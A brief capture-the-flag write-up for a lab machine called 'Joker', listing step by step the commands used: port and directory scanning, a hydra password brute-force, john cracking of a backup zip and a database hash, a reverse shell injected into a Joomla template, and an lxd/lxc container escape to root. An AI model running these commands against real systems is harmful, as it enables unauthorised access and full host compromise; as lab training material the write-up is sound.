# CTF Writeup: Joker

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 22,80,8080 are open
- Step 2: made gobuster dir -u http://joker.thm/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip
- Step 3: retrieved hidden dirs and found potential users "joker & bats" 
- Step 4: accessed :8080 webpage which prompted me for authorization.
- Step 5: made hydra -l joker -P /usr/share/wordlists/rockyou.txt joker.thm -s 8080 http-get
- Step 6: gained creds and logged in --> joomlah page, but wappalyzer doesn't reveal the version.
- Step 7: decided to run nikto --> made nikto -h http://joker.thm:8080/ -id joker:hannah
- Step 8: retrieved /backup.zip directory and downloaded it
- Step 9: made zip2john backup.zip > hash --> made john hash --wordlist=/usr/share/wordlist/rockyou.txt
- Step 10: retrieved password for .zip file --> hannah
- Step 11: opened up zip and extracted it on local machine --> under /db found sql file
in which I retrieved an hashed password.
- Step 12: saved it with nano to hash --> made john hash --wordlist=/usr/share/wordlist/rockyou.txt 
- Step 13: retrieved password and logged into cms 
- Step 14: navigated to extensions --> templates --> beez3 and injected rev shell into index.php
- Step 15: gained rce as www-data user
- Step 16: made id and found out that the user www-data is part of the lxd group --> educated myself about lxd and lxc
- Step 17: installed alpine-builder on local machine
- Step 18: made sudo ./build-alpiner --> got .tar file --> stored it on target machine in /tmp dir
- Step 19: made lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myalpine
- Step 20: made lxc init myalpine ignite -c security.privileged=true
- Step 21: made lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
- Step 22: made lxc start ignite
- Step 23: made lxc exec ignite /bin/sh --> gained root rce
- Step 24: navigated to /mnt/root /root and gained final.txt


---

## Key Learnings

- Immensly strengthened enumeration Knowledge
- Learned about lxd/lxc privilege escelation
- Learned more about joomlah cms
